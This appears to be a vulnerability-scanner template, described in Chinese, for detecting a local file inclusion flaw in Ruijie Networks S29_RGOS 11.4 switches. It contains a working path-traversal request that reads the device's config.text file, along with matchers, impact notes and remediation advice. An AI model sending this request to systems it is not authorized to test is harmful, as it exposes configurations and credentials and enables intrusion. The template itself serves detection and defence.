id: ruijie-networks-lfi

info:
  name: Ruijie Networks Switch eWeb S29_RGOS 11.4 - 本地文件包含漏洞
  author: pikpikcu
  severity: high
  description: |
    该模板用于检测 Ruijie Networks Switch eWeb S29_RGOS 11.4 - 本地文件包含漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/download.do?file=../../../../config.text` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://exploit-db.com/exploits/48755
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-23,CWE-73
  metadata:
    max-request: 1
  tags: ruijie,lfi,edb,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/download.do?file=../../../../config.text"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'filename="config.text"'
          - "Content-Type: application/octet-stream"
        part: header

      - type: word
        words:
          - "version S29_RGOS 11.4"
        part: body
        condition: and

      - type: status
        status:
          - 200
